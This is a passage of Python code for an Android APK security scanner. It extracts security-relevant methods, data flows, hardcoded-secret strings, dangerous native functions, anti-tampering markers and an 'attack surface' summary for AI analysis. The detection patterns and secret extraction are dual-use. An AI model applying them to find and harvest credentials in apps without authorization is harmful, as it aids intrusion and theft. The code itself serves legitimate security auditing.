        (r'(?:public|private|protected)\s+\w+\s+\w*(?:Cipher|Crypto|AES|RSA|Hash)\w*\s*\([^)]*\)\s*(?:throws[^{]*)?\{', 'cryptography'),
        
        # Database/SQL
        (r'(?:public|private|protected)\s+\w+\s+(executeQuery|rawQuery|execSQL|query|insert|update|delete)\s*\([^)]*\)\s*(?:throws[^{]*)?\{', 'database'),
        (r'@(?:Query|Insert|Update|Delete)\s*\([^)]*\)\s*(?:public|private|protected)?\s+\w+\s+(\w+)\s*\([^)]*\)', 'database'),
        
        # Network/API
        (r'@(?:GET|POST|PUT|DELETE|PATCH)\s*\([^)]*\)\s*(?:public|private|protected)?\s+\w+\s+(\w+)\s*\([^)]*\)', 'network'),
        (r'(?:public|private|protected)\s+\w+\s+(makeRequest|sendRequest|fetchData|callApi|httpGet|httpPost)\s*\([^)]*\)\s*(?:throws[^{]*)?\{', 'network'),
        
        # Android Lifecycle (entry points)
        (r'@Override\s+(?:public|protected)\s+void\s+(onCreate|onStart|onResume|onReceive|onBind|onStartCommand)\s*\([^)]*\)\s*\{', 'lifecycle'),
        (r'@Override\s+(?:public|protected)\s+\w+\s+(onActivityResult|onNewIntent|handleIntent)\s*\([^)]*\)\s*\{', 'lifecycle'),
        
        # WebView
        (r'(?:public|private|protected)\s+\w+\s+(loadUrl|loadData|evaluateJavascript|addJavascriptInterface)\s*\([^)]*\)\s*(?:throws[^{]*)?\{', 'webview'),
        (r'@JavascriptInterface\s+(?:public)\s+\w+\s+(\w+)\s*\([^)]*\)\s*\{', 'webview'),
        
        # File/Storage
        (r'(?:public|private|protected)\s+\w+\s+(saveFile|readFile|writeToFile|openFile|getSharedPreferences)\s*\([^)]*\)\s*(?:throws[^{]*)?\{', 'storage'),
        
        # Payment
        (r'(?:public|private|protected)\s+\w+\s+(processPayment|handlePurchase|validateReceipt|chargeCard)\s*\([^)]*\)\s*(?:throws[^{]*)?\{', 'payment'),
    ]
    
    for pattern, category in security_method_patterns:
        for match in re.finditer(pattern, content, re.IGNORECASE | re.MULTILINE):
            method_start = match.start()
            method_name = match.group(1) if match.lastindex else "unknown"
            
            # Extract the method body (find matching braces)
            method_body = _extract_method_body(content, method_start)
            if method_body and len(method_body) > 50:  # Skip trivial methods
                methods.append({
                    "class": class_name,
                    "method": method_name,
                    "category": category,
                    "code": method_body[:3000],  # Cap at 3KB per method
                    "length": len(method_body)
                })
    
    return methods


def _extract_method_body(content: str, start_pos: int, max_length: int = 5000) -> str:
    """Extract a method body by finding matching braces."""
    # Find the opening brace
    brace_pos = content.find('{', start_pos)
    if brace_pos == -1:
        return ""
    
    # Count braces to find the end
    depth = 1
    pos = brace_pos + 1
    end_pos = min(len(content), brace_pos + max_length)
    
    while pos < end_pos and depth > 0:
        char = content[pos]
        if char == '{':
            depth += 1
        elif char == '}':
            depth -= 1
        pos += 1
    
    if depth == 0:
        # Include some context before the method (signature, annotations)
        context_start = max(0, start_pos - 200)
        return content[context_start:pos]
    else:
        # Method too long, return what we have
        return content[start_pos:end_pos] + "\n// ... [METHOD TRUNCATED]"


# ============================================================================
# IMPROVEMENT 3: Cross-Reference Analysis
# ============================================================================

def _analyze_cross_references(output_dir: Path, max_files: int = 300) -> Dict[str, Any]:
    """
    Analyze method calls across classes to understand data flow and component interactions.
    This helps identify how sensitive data moves through the app.
    """
    import re
    from collections import defaultdict
    
    sources_dir = output_dir / "sources"
    if not sources_dir.exists():
        return {"call_graph": {}, "component_interactions": [], "data_flows": []}
    
    # Collect class info and method calls
    class_methods = defaultdict(set)  # class -> methods defined
    method_calls = defaultdict(list)  # class.method -> list of (called_class, called_method)
    class_fields = defaultdict(list)  # class -> list of fields with types
    class_inheritance = {}  # class -> parent class
    interface_implementations = defaultdict(list)  # class -> list of interfaces
    
    # Patterns
    method_def_pattern = re.compile(r'(?:public|private|protected)\s+(?:static\s+)?(?:final\s+)?(\w+(?:<[^>]+>)?)\s+(\w+)\s*\([^)]*\)\s*(?:throws[^{]*)?\{')
    method_call_pattern = re.compile(r'(\w+)\.(\w+)\s*\(')
    new_instance_pattern = re.compile(r'new\s+(\w+)\s*\(')
    field_pattern = re.compile(r'(?:private|protected|public)\s+(?:static\s+)?(?:final\s+)?(\w+(?:<[^>]+>)?)\s+(\w+)\s*[;=]')
    extends_pattern = re.compile(r'class\s+(\w+)\s+extends\s+(\w+)')
    implements_pattern = re.compile(r'class\s+(\w+)[^{]*implements\s+([^{]+)')
    
    java_files = list(sources_dir.rglob("*.java"))
    
    # Filter out library files
    app_files = [f for f in java_files if not any(
        lib in str(f).lower() for lib in ['com/google/', 'androidx/', 'android/support/', 'kotlin/']
    )][:max_files]
    
    for java_file in app_files:
        try:
            content = java_file.read_text(encoding='utf-8', errors='ignore')[:100000]
            class_name = java_file.stem
            
            # Extract method definitions
            for match in method_def_pattern.finditer(content):
                method_name = match.group(2)
                class_methods[class_name].add(method_name)
            
            # Extract fields
            for match in field_pattern.finditer(content[:20000]):
                field_type, field_name = match.group(1), match.group(2)
                class_fields[class_name].append({"type": field_type, "name": field_name})
            
            # Extract inheritance
            ext_match = extends_pattern.search(content[:5000])
            if ext_match:
                class_inheritance[ext_match.group(1)] = ext_match.group(2)
            
            # Extract interface implementations
            impl_match = implements_pattern.search(content[:5000])
            if impl_match:
                interfaces = [i.strip() for i in impl_match.group(2).split(',')]
                interface_implementations[impl_match.group(1)].extend(interfaces)
            
            # Extract method calls within method bodies
            for method_match in method_def_pattern.finditer(content):
                caller_method = method_match.group(2)
                method_start = method_match.end()
                
                # Find method body (simple brace matching, limited)
                depth = 1
                pos = method_start
                while pos < min(len(content), method_start + 5000) and depth > 0:
                    if content[pos] == '{':
                        depth += 1
                    elif content[pos] == '}':
                        depth -= 1
                    pos += 1
                
                method_body = content[method_start:pos]
                
                # Find calls in this method
                for call_match in method_call_pattern.finditer(method_body):
                    called_obj = call_match.group(1)
                    called_method = call_match.group(2)
                    
                    # Skip common non-interesting calls
                    if called_obj.lower() in ['log', 'logger', 'system', 'string', 'list', 'map', 'set', 'this', 'super']:
                        continue
                    
                    method_calls[f"{class_name}.{caller_method}"].append({
                        "target": called_obj,
                        "method": called_method
                    })
                
                # Find object instantiations
                for new_match in new_instance_pattern.finditer(method_body):
                    instantiated_class = new_match.group(1)
                    if instantiated_class[0].isupper():  # Likely a class, not primitive
                        method_calls[f"{class_name}.{caller_method}"].append({
                            "target": instantiated_class,
                            "method": "<init>",
                            "type": "instantiation"
                        })
                        
        except Exception as e:
            continue
    
    # Analyze component interactions
    component_interactions = []
    security_classes = {'auth', 'login', 'crypto', 'encrypt', 'api', 'http', 'network', 'database', 'sql'}
    
    for caller, calls in method_calls.items():
        caller_class = caller.split('.')[0].lower()
        
        for call in calls:
            target = call.get('target', '').lower()
            
            # Check if this is a security-relevant interaction
            if any(sec in caller_class for sec in security_classes) or any(sec in target for sec in security_classes):
                component_interactions.append({
                    "from": caller,
                    "to": f"{call['target']}.{call['method']}",
                    "type": call.get('type', 'call'),
                    "security_relevant": True
                })
    
    # Identify data flow patterns (sensitive data movement)
    data_flows = []
    sensitive_patterns = {
        'password': 'credential',
        'token': 'authentication',
        'secret': 'secret',
        'apikey': 'api_key',
        'location': 'location_data',
        'contact': 'pii',
        'phone': 'pii',
        'email': 'pii',
        'card': 'payment',
        'credit': 'payment'
    }
    
    for class_name, fields in class_fields.items():
        for field in fields:
            field_name_lower = field['name'].lower()
            for pattern, category in sensitive_patterns.items():
                if pattern in field_name_lower:
                    # Find what methods access this field
                    accessing_methods = []
                    for caller, calls in method_calls.items():
                        if class_name in caller:
                            for call in calls:
                                if field['name'] in str(call):
                                    accessing_methods.append(caller)
                    
                    if accessing_methods:
                        data_flows.append({
                            "data_type": category,
                            "field": f"{class_name}.{field['name']}",
                            "accessed_by": accessing_methods[:5],
                            "risk": "high" if category in ['credential', 'payment', 'secret'] else "medium"
                        })
                    break
    
    return {
        "call_graph": {k: v[:20] for k, v in list(method_calls.items())[:100]},  # Limit for context size
        "component_interactions": component_interactions[:50],
        "data_flows": data_flows[:30],
        "class_hierarchy": {
            "inheritance": dict(list(class_inheritance.items())[:50]),
            "implementations": {k: v for k, v in list(interface_implementations.items())[:50]}
        },
        "stats": {
            "classes_analyzed": len(app_files),
            "methods_found": sum(len(v) for v in class_methods.values()),
            "call_edges": sum(len(v) for v in method_calls.values()),
            "sensitive_data_fields": len(data_flows)
        }
    }


# ============================================================================
# IMPROVEMENT 4: Enhanced Native Library Analysis for AI Context
# ============================================================================

def _analyze_native_for_ai_context(apk_path: Path) -> Dict[str, Any]:
    """
    Extract detailed native library information formatted for AI analysis.
    Goes beyond basic analysis to provide attack surface context.
    """
    import zipfile
    
    result = {
        "libraries": [],
        "total_size_mb": 0,
        "architectures": [],
        "jni_bridge_points": [],
        "security_concerns": [],
        "crypto_usage": [],
        "network_indicators": [],
        "obfuscation_indicators": [],
        "attack_surface": []
    }
    
    if not apk_path.exists():
        return result
    
    DANGEROUS_FUNCTIONS = [
        ('strcpy', 'Buffer overflow risk - unsafe string copy'),
        ('strcat', 'Buffer overflow risk - unsafe string concatenation'),
        ('sprintf', 'Format string vulnerability risk'),
        ('gets', 'Critical buffer overflow - never use'),
        ('scanf', 'Input validation issues'),
        ('system', 'Command injection risk'),
        ('popen', 'Command injection risk'),
        ('exec', 'Code execution'),
        ('dlopen', 'Dynamic library loading'),
        ('mmap', 'Memory manipulation'),
        ('mprotect', 'Memory protection changes'),
        ('fork', 'Process spawning'),
    ]
    
    try:
        with zipfile.ZipFile(str(apk_path), 'r') as zf:
            native_files = [f for f in zf.namelist() if f.endswith('.so') and '/lib/' in f]
            
            architectures = set()
            total_size = 0
            
            for so_path in native_files[:20]:  # Limit to first 20 libs
                parts = so_path.split('/')
                arch = None
                for part in parts:
                    if part in ['armeabi-v7a', 'arm64-v8a', 'x86', 'x86_64']:
                        arch = part
                        architectures.add(arch)
                        break
                
                lib_name = so_path.split('/')[-1]
                
                try:
                    so_data = zf.read(so_path)
                    size = len(so_data)
                    total_size += size
                    
                    lib_info = {
                        "name": lib_name,
                        "size_kb": size // 1024,
                        "architecture": arch,
                        "jni_functions": [],
                        "dangerous_functions": [],
                        "strings_of_interest": [],
                        "crypto_indicators": [],
                    }
                    
                    # Extract printable strings
                    strings = []
                    current = b''
                    for byte in so_data:
                        if 32 <= byte < 127:
                            current += bytes([byte])
                        else:
                            if len(current) >= 8:
                                try:
                                    s = current.decode('ascii')
                                    strings.append(s)
                                except:
                                    pass
                            current = b''
                    
                    # Analyze strings
                    for s in strings:
                        s_lower = s.lower()
                        
                        # JNI functions
                        if s.startswith('Java_') or s.startswith('JNI_'):
                            lib_info["jni_functions"].append(s)
                            result["jni_bridge_points"].append({
                                "library": lib_name,
                                "function": s,
                                "description": "JNI bridge - Java/native boundary"
                            })
                        
                        # Dangerous functions
                        for func, desc in DANGEROUS_FUNCTIONS:
                            if func in s and len(s) < 30:
                                lib_info["dangerous_functions"].append(func)
                                result["security_concerns"].append({
                                    "library": lib_name,
                                    "issue": f"Uses {func}",
                                    "risk": desc
                                })
                        
                        # URLs/Network
                        if s.startswith('http://') or s.startswith('https://'):
                            lib_info["strings_of_interest"].append(s[:100])
                            result["network_indicators"].append({
                                "library": lib_name,
                                "url": s[:100],
                                "secure": s.startswith('https')
                            })
                        
                        # Crypto
                        for crypto in ['AES', 'RSA', 'SHA', 'MD5', 'HMAC', 'EVP_', 'OpenSSL', 'mbedtls']:
                            if crypto in s:
                                lib_info["crypto_indicators"].append(crypto)
                                if crypto not in [c['algorithm'] for c in result["crypto_usage"]]:
                                    result["crypto_usage"].append({
                                        "library": lib_name,
                                        "algorithm": crypto,
                                        "weak": crypto in ['MD5', 'SHA1', 'DES']
                                    })
                        
                        # Potential secrets
                        if any(kw in s_lower for kw in ['api_key', 'secret', 'password', 'token', 'private_key']):
                            if len(s) > 10 and '=' in s:
                                result["security_concerns"].append({
                                    "library": lib_name,
                                    "issue": "Potential hardcoded secret",
                                    "indicator": s[:30] + "..."
                                })
                        
                        # Anti-tampering indicators
                        if any(indicator in s_lower for indicator in ['frida', 'xposed', 'magisk', 'substrate', 'ptrace']):
                            result["obfuscation_indicators"].append({
                                "library": lib_name,
                                "technique": s,
                                "purpose": "Anti-tampering/Anti-debugging"
                            })
                    
                    lib_info["jni_functions"] = lib_info["jni_functions"][:20]
                    lib_info["dangerous_functions"] = list(set(lib_info["dangerous_functions"]))
                    lib_info["strings_of_interest"] = lib_info["strings_of_interest"][:10]
                    lib_info["crypto_indicators"] = list(set(lib_info["crypto_indicators"]))
                    
                    result["libraries"].append(lib_info)
                    
                except Exception as e:
                    continue
            
            result["architectures"] = list(architectures)
            result["total_size_mb"] = round(total_size / (1024 * 1024), 2)
            
            # Generate attack surface entries
            for lib in result["libraries"]:
                if lib["jni_functions"]:
                    result["attack_surface"].append({
                        "entry_point": f"Native library: {lib['name']}",
                        "type": "JNI bridge",
                        "functions": len(lib["jni_functions"]),
                        "risk": "high" if lib["dangerous_functions"] else "medium"
                    })
                    
    except Exception as e:
        logger.debug(f"Native analysis error: {e}")
    
    return result


# ============================================================================
# IMPROVEMENT 5: Parallel File Processing
# ============================================================================

def _process_java_file_batch(args) -> Dict[str, Any]:
    """
    Process a single Java file for parallel scanning.
    Returns extracted information about the file.
    """
    java_file_path, sources_dir_str, patterns_config = args
    
    try:
        java_file = Path(java_file_path)
        sources_dir = Path(sources_dir_str)
        
        result = {
            "success": True,
            "class_name": java_file.stem,
            "rel_path": str(java_file.relative_to(sources_dir)),
            "imports": [],
            "endpoints": [],
            "features": [],
            "security_issues": [],
            "methods": [],
            "strings": [],
            "size": 0
        }
        
        file_size = java_file.stat().st_size
        result["size"] = file_size
        
        # Read content (partial for large files)
        if file_size > 100000:
            with open(java_file, 'r', encoding='utf-8', errors='ignore') as f:
                content_start = f.read(50000)
                f.seek(max(0, file_size - 20000))
                content_end = f.read(20000)
            content = content_start + "\n// [TRUNCATED]\n" + content_end
        else:
            content = java_file.read_text(encoding='utf-8', errors='ignore')
        
        # Extract imports
        import_pattern = re.compile(r'^import\s+([\w.]+);', re.MULTILINE)
        for match in import_pattern.finditer(content[:10000]):
            result["imports"].append(match.group(1))
        
        # Extract URLs
        url_pattern = re.compile(r'["\']((https?://[^"\']+|/api/[^"\']+|/v\d+/[^"\']+))["\']')
        for match in url_pattern.finditer(content):
            result["endpoints"].append(match.group(1))
        
        # Extract method signatures
        method_pattern = re.compile(r'(public|private|protected)\s+(?:static\s+)?(\w+)\s+(\w+)\s*\([^)]*\)')
        for match in method_pattern.finditer(content[:30000]):
            if match.group(1) == 'public':
                result["methods"].append(match.group(3))
        
        # Feature detection (simplified for parallel)
        content_lower = content.lower()
        feature_keywords = {
            "authentication": ['login', 'auth', 'signin', 'password'],
            "database": ['sqlite', 'room', 'database', 'cursor'],
            "network": ['retrofit', 'okhttp', 'http', 'urlconnection'],
            "encryption": ['cipher', 'encrypt', 'decrypt', 'aes'],
            "webview": ['webview', 'javascriptinterface', 'loadurl'],
            "payment": ['payment', 'billing', 'purchase'],
        }
        
        for feature, keywords in feature_keywords.items():
            if any(kw in content_lower for kw in keywords):
                result["features"].append(feature)
        
        # Security patterns (simplified)
        security_checks = [
            (r'(?i)password\s*=\s*["\'][^"\']+["\']', 'hardcoded_password'),
            (r'(?i)api.?key\s*=\s*["\'][^"\']+["\']', 'hardcoded_key'),
            (r'(?i)execSQL\s*\([^)]*\+', 'sql_injection'),
            (r'setJavaScriptEnabled\s*\(\s*true', 'webview_js'),
        ]
        
        for pattern, issue_type in security_checks:
            if re.search(pattern, content):
                result["security_issues"].append(issue_type)
        
        return result
        
    except Exception as e:
        return {"success": False, "error": str(e), "class_name": str(java_file_path)}


def _scan_files_parallel(output_dir: Path, max_files: int = 500, workers: int = 4) -> Dict[str, Any]:
    """
    Scan Java files using parallel processing for faster analysis.
    Uses multiprocessing to scan files concurrently.
    """
    import concurrent.futures
    import time
    
    start_time = time.time()
    sources_dir = output_dir / "sources"
    
    if not sources_dir.exists():
        return {"results": [], "stats": {"total": 0, "scanned": 0, "duration": 0}}
    
    all_java_files = list(sources_dir.rglob("*.java"))
    
    # Filter out library files
    app_files = [
        f for f in all_java_files 
        if not any(lib in str(f).lower() for lib in [
            'com/google/', 'androidx/', 'android/support/', 'kotlin/',
            'okhttp3/', 'retrofit2/', 'com/squareup/', 'dagger/'
        ])
    ][:max_files]
    
    # Sort by priority (security files first)
    def priority(path):
        name = path.name.lower()
        if any(kw in name for kw in ['login', 'auth', 'password', 'crypto', 'encrypt']):
            return 0
        if any(kw in name for kw in ['api', 'http', 'network', 'webview']):
            return 1
        if any(kw in name for kw in ['database', 'sql', 'dao']):
            return 2
        return 3
    
    app_files.sort(key=priority)
    
    # Prepare arguments for parallel processing
    args_list = [(str(f), str(sources_dir), {}) for f in app_files]
    
    results = []
    
    # Use ThreadPoolExecutor for I/O bound tasks (file reading)
    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as executor:
        futures = {executor.submit(_process_java_file_batch, args): args for args in args_list}
        
        for future in concurrent.futures.as_completed(futures, timeout=60):
            try:
                result = future.result(timeout=5)
                if result.get("success"):
                    results.append(result)
            except Exception as e:
                continue
    
    duration = time.time() - start_time
    
    # Aggregate results
    all_endpoints = set()
    all_features = set()
    all_issues = []
    all_imports = set()
    
    for r in results:
        all_endpoints.update(r.get("endpoints", []))
        all_features.update(r.get("features", []))
        all_imports.update(r.get("imports", []))
        for issue in r.get("security_issues", []):
            all_issues.append({"class": r["class_name"], "issue": issue})
    
    return {
        "file_results": results,
        "aggregated": {
            "endpoints": list(all_endpoints)[:50],
            "features": list(all_features),
            "imports": list(all_imports)[:100],
            "security_issues": all_issues[:100]
        },
        "stats": {
            "total_files": len(all_java_files),
            "app_files": len(app_files),
            "scanned": len(results),
            "duration_seconds": round(duration, 2),
            "files_per_second": round(len(results) / max(duration, 0.1), 1)
        }
    }


def _scan_all_files_for_ai_context(output_dir: Path, max_files: int = 500, max_file_size: int = 100000) -> Dict[str, Any]:
    """
    Scan ALL decompiled Java files to extract structured information for AI analysis.
    This mirrors the pattern-based security scan but focuses on extracting features,
    not just vulnerabilities.
    
    ROBUSTNESS FEATURES:
    - max_files: Limit total files scanned to prevent timeouts on massive APKs
    - max_file_size: Skip files over 100KB (likely generated code)
    - Prioritizes security-relevant files first
    - Graceful degradation on errors
    
    Returns a comprehensive structured context that summarizes the ENTIRE codebase.
    """
    import time
    start_time = time.time()
    MAX_SCAN_TIME = 60  # 60 second max scan time
    
    sources_dir = output_dir / "sources"
    if not sources_dir.exists():
        return {"full_scan_context": "", "class_summaries": [], "stats": {}}
    
    all_java_files = list(sources_dir.rglob("*.java"))
    total_classes = len(all_java_files)
    
    # OPTIMIZATION: Sort files to prioritize security-relevant ones first
    def priority_score(path: Path) -> int:
        """Higher score = scanned first (security critical)"""
        name_lower = path.name.lower()
        path_lower = str(path).lower()
        
        # Skip library files entirely
        if any(lib in path_lower for lib in ['com/google/', 'androidx/', 'android/support/', 'kotlin/']):
            return -100
            
        score = 0
        # Security-critical files get highest priority
        if any(kw in name_lower for kw in ['login', 'auth', 'password', 'secret', 'token', 'crypto', 'encrypt']):
            score += 50
        if any(kw in name_lower for kw in ['api', 'http', 'network', 'request', 'webview']):
            score += 40
        if any(kw in name_lower for kw in ['database', 'sql', 'dao', 'repository']):
            score += 35
        if any(kw in name_lower for kw in ['payment', 'billing', 'wallet', 'card']):
            score += 45
        if any(kw in name_lower for kw in ['main', 'activity', 'service']):
            score += 20
        return score
    
    # Sort by priority (security-critical first)
    all_java_files.sort(key=priority_score, reverse=True)
    
    # Track findings across all files
    all_classes_info = []
    api_endpoints = set()
    detected_features = set()
    imported_libraries = set()
    string_literals = []
    files_skipped_library = 0
    files_skipped_timeout = 0
    
    # NEW: Track extracted security methods
    extracted_methods = []
    
    # NEW: Scan resource files first (strings.xml, manifest, etc.)
    logger.info("Full scan: Scanning resource files...")
    resource_data = _scan_resource_files(output_dir)
    
    # Add URLs from resources to endpoints
    for url_info in resource_data.get("urls", []):
        api_endpoints.add(url_info.get("value", ""))
    
    # Patterns for extraction (compile once, reuse)
    import_pattern = re.compile(r'^import\s+([\w.]+);', re.MULTILINE)
    url_pattern = re.compile(r'["\']((https?://[^"\']+|/api/[^"\']+|/v\d+/[^"\']+))["\']')
    method_pattern = re.compile(r'(public|private|protected)?\s*(static)?\s*[\w<>\[\]]+\s+(\w+)\s*\([^)]*\)\s*{', re.MULTILINE)
    string_pattern = re.compile(r'"([^"]{10,100})"')
    
    # Feature detection patterns (applied to each file)
    feature_patterns = {
        "authentication": re.compile(r'(login|auth|signin|signup|register|credential|session|token)', re.IGNORECASE),
        "database": re.compile(r'(sqlite|room|realm|cursor|database|dao|repository|query)', re.IGNORECASE),
        "network": re.compile(r'(retrofit|okhttp|httpurlconnection|volley|urlconnection|httpClient)', re.IGNORECASE),
        "encryption": re.compile(r'(cipher|encrypt|decrypt|aes|rsa|md5|sha1|sha256|hash|crypto)', re.IGNORECASE),
        "location": re.compile(r'(location|gps|geofence|fusedlocation|latitude|longitude)', re.IGNORECASE),
        "camera": re.compile(r'(camera|cameramanager|imagecapture|takepicture|photouri)', re.IGNORECASE),
        "storage": re.compile(r'(sharedpreferences|fileoutputstream|fileinputstream|contentresolver)', re.IGNORECASE),
        "webview": re.compile(r'(webview|javascriptinterface|webviewclient|addjavascriptinterface)', re.IGNORECASE),
        "payment": re.compile(r'(payment|billing|inappbilling|purchase|subscription|checkout)', re.IGNORECASE),
        "push_notifications": re.compile(r'(firebasemessaging|fcm|pushnotification|notificationmanager)', re.IGNORECASE),
        "biometric": re.compile(r'(biometric|fingerprint|facerecognition|biometricprompt)', re.IGNORECASE),
        "analytics": re.compile(r'(firebase|analytics|amplitude|mixpanel|crashlytics|appsflyer)', re.IGNORECASE),
        "social": re.compile(r'(facebook|twitter|instagram|linkedin|socialmedia|share)', re.IGNORECASE),
        "deeplink": re.compile(r'(deeplink|applink|intent.*filter|scheme)', re.IGNORECASE),
        "bluetooth": re.compile(r'(bluetooth|ble|bluetoothadapter|gatt)', re.IGNORECASE),
        "nfc": re.compile(r'(nfc|nfcadapter|ndef)', re.IGNORECASE),
        "accessibility": re.compile(r'(accessibility|accessibilityservice|contentdescription)', re.IGNORECASE),
    }
    
    # Security-relevant patterns
    security_patterns = {
        "hardcoded_key": re.compile(r'(api.?key|secret.?key|password|auth.?token)\s*=\s*["\'][^"\']+["\']', re.IGNORECASE),
        "weak_crypto": re.compile(r'(MD5|SHA1|DES|RC4|ECB|NoPadding)', re.IGNORECASE),
        "sql_construction": re.compile(r'(rawQuery|execSQL|SELECT\s+\*|INSERT\s+INTO|UPDATE\s+\w+\s+SET).*\+', re.IGNORECASE),
        "webview_js": re.compile(r'setJavaScriptEnabled\s*\(\s*true\s*\)'),
        "ssl_bypass": re.compile(r'(trustallcerts|sslsocketfactory|hostnameVerifier.*ALLOW_ALL|X509TrustManager)', re.IGNORECASE),
        "log_sensitive": re.compile(r'Log\.(d|i|v|w|e)\s*\([^)]*(password|token|secret|key|credential)', re.IGNORECASE),
        "intent_redirect": re.compile(r'startActivity\s*\(\s*getIntent\(\)'),
        "exported_component": re.compile(r'android:exported\s*=\s*"true"'),
        "debuggable": re.compile(r'android:debuggable\s*=\s*"true"'),
        "cleartext": re.compile(r'usesCleartextTraffic\s*=\s*true'),
    }
    
    scanned_count = 0
    app_package = None
    
    for java_file in all_java_files[:max_files]:  # Limit total files
        # Check timeout
        if time.time() - start_time > MAX_SCAN_TIME:
            files_skipped_timeout = len(all_java_files) - scanned_count - files_skipped_library
            logger.warning(f"Full scan: Timeout reached after {MAX_SCAN_TIME}s, scanned {scanned_count} files")
            break
            
        try:
            rel_path = str(java_file.relative_to(sources_dir))
            
            # Skip third-party libraries (we want app code only)
            if any(lib in rel_path.lower() for lib in [
                'com/google/', 'androidx/', 'android/support/', 'kotlin/',
                'okhttp3/', 'retrofit2/', 'com/squareup/', 'com/facebook/', 
                'com/twitter/', 'io/reactivex/', 'dagger/', 'butterknife/',
                'com/bumptech/', 'com/jakewharton/', 'org/apache/', 'com/android/'
            ]):
                files_skipped_library += 1
                continue
            
            file_size = java_file.stat().st_size
            
            # For large files (>100KB): still scan them but read partial content
            # Large files might be important (API clients, main activities)
            is_large_file = file_size > max_file_size
            
            if is_large_file:
                # Read first 50KB + last 20KB of large files (captures imports, class structure, and recent methods)
                try:
                    with open(java_file, 'r', encoding='utf-8', errors='ignore') as f:
                        content_start = f.read(50000)
                        f.seek(max(0, file_size - 20000))
                        content_end = f.read(20000)
                    content = content_start + "\n// ... [MIDDLE SECTION TRUNCATED FOR LARGE FILE] ...\n" + content_end
                except:
                    content = java_file.read_text(encoding='utf-8', errors='ignore')[:70000]
            else:
                content = java_file.read_text(encoding='utf-8', errors='ignore')
            
            class_name = java_file.stem
            scanned_count += 1
            
            # Detect app package
            if not app_package:
                pkg_match = re.search(r'^package\s+([\w.]+);', content, re.MULTILINE)
                if pkg_match:
                    app_package = pkg_match.group(1)
            
            # Extract imports
            for match in import_pattern.finditer(content):
                imported_libraries.add(match.group(1))
            
            # Extract URLs/endpoints
            for match in url_pattern.finditer(content):
                api_endpoints.add(match.group(1))
            
            # Extract interesting strings (limit to first 30KB)
            for match in string_pattern.finditer(content[:30000]):
                s = match.group(1)
                if any(kw in s.lower() for kw in ['http', 'api', 'key', 'token', 'secret', 'password', 'auth']):
                    if len(string_literals) < 100:  # Cap at 100 strings
                        string_literals.append({"class": class_name, "value": s[:100]})
            
            # Detect features in this file (use first 50KB for performance)
            file_features = set()
            content_for_features = content[:50000]
            for feature_name, pattern in feature_patterns.items():
                if pattern.search(content_for_features):
                    file_features.add(feature_name)
                    detected_features.add(feature_name)
            
            # Detect security issues (use limited content for performance)
            file_security_issues = []
            content_for_security = content[:50000]
            for issue_name, pattern in security_patterns.items():
                matches = pattern.findall(content_for_security)
                if matches:
                    file_security_issues.append({
                        "type": issue_name,
                        "count": len(matches) if isinstance(matches, list) else 1
                    })
            
            # Extract key method signatures (public methods only, limited scan)
            methods = []
            for match in method_pattern.finditer(content[:20000]):  # First 20k chars
                if match.group(1) == 'public':
                    methods.append(match.group(3))
            
            # NEW: Extract security-relevant methods with their full code
            security_methods = _extract_security_methods(content, class_name)
            if security_methods and len(extracted_methods) < 200:  # Cap at 200 methods
                extracted_methods.extend(security_methods[:10])  # Max 10 methods per class
            
            # Track class info (cap at 300 classes for memory)
            if len(all_classes_info) < 300:
                all_classes_info.append({
                    "class_name": class_name,
                    "path": rel_path,
                    "features": list(file_features),
                    "security_issues": file_security_issues,
                    "public_methods": methods[:10],  # Top 10 public methods
                    "has_extracted_methods": len(security_methods) > 0,
                    "size": file_size
                })
            
        except Exception as e:
            logger.debug(f"Error scanning {java_file}: {e}")
            continue
    
    scan_duration = time.time() - start_time
    logger.info(f"Full scan completed: {scanned_count} files in {scan_duration:.1f}s (skipped: {files_skipped_library} libs, {files_skipped_timeout} timeout), {len(extracted_methods)} security methods extracted")
    
    # Build structured summary
    feature_summary = {}
    for cls in all_classes_info:
        for feature in cls["features"]:
            if feature not in feature_summary:
                feature_summary[feature] = []
            feature_summary[feature].append(cls["class_name"])
    
    security_summary = {}
    for cls in all_classes_info:
        for issue in cls["security_issues"]:
            issue_type = issue["type"]
            if issue_type not in security_summary:
                security_summary[issue_type] = []
            security_summary[issue_type].append({
                "class": cls["class_name"],
                "path": cls["path"],
                "count": issue["count"]
            })
    
    # Build the full scan context string
    full_scan_context = f"""
## COMPLETE CODEBASE SCAN RESULTS
This analysis covers ALL {scanned_count} app classes (excluding third-party libraries).

### DETECTED FEATURES BY CATEGORY
"""
    for feature, classes in sorted(feature_summary.items(), key=lambda x: len(x[1]), reverse=True):
        full_scan_context += f"\n**{feature.upper()}** ({len(classes)} classes):\n"
        full_scan_context += f"  Classes: {', '.join(classes[:15])}"
        if len(classes) > 15:
            full_scan_context += f" ...and {len(classes) - 15} more"
        full_scan_context += "\n"
    
    full_scan_context += f"""
### SECURITY PATTERNS DETECTED
"""
    for issue_type, occurrences in sorted(security_summary.items(), key=lambda x: len(x[1]), reverse=True):
        full_scan_context += f"\n**{issue_type.replace('_', ' ').upper()}** ({len(occurrences)} locations):\n"
        for occ in occurrences[:5]:
            full_scan_context += f"  - {occ['class']} ({occ['path']}): {occ['count']} occurrences\n"
        if len(occurrences) > 5:
            full_scan_context += f"  ...and {len(occurrences) - 5} more locations\n"
    
    full_scan_context += f"""
### API ENDPOINTS FOUND ({len(api_endpoints)} total)
"""
    for endpoint in sorted(api_endpoints)[:30]:
        full_scan_context += f"  - {endpoint}\n"
    if len(api_endpoints) > 30:
        full_scan_context += f"  ...and {len(api_endpoints) - 30} more endpoints\n"
    
    full_scan_context += f"""
### IMPORTED LIBRARIES ({len(imported_libraries)} packages)
"""
    # Group by top-level package
    lib_groups = {}
    for lib in imported_libraries:
        parts = lib.split('.')
        if len(parts) >= 2:
            group = '.'.join(parts[:2])
            if group not in lib_groups:
                lib_groups[group] = set()
            lib_groups[group].add(lib)
    
    for group in sorted(lib_groups.keys())[:20]:
        full_scan_context += f"  - {group} ({len(lib_groups[group])} imports)\n"
    
    full_scan_context += f"""
### INTERESTING STRING LITERALS ({len(string_literals)} found)
"""
    for s in string_literals[:20]:
        full_scan_context += f"  - [{s['class']}] \"{s['value']}\"\n"
    
    full_scan_context += f"""
### CLASS SUMMARY BY SIZE (top 20 largest)
"""
    sorted_classes = sorted(all_classes_info, key=lambda x: x['size'], reverse=True)[:20]
    for cls in sorted_classes:
        full_scan_context += f"  - {cls['class_name']} ({cls['size']:,} bytes) - Features: {', '.join(cls['features'][:5]) or 'none'}\n"
    
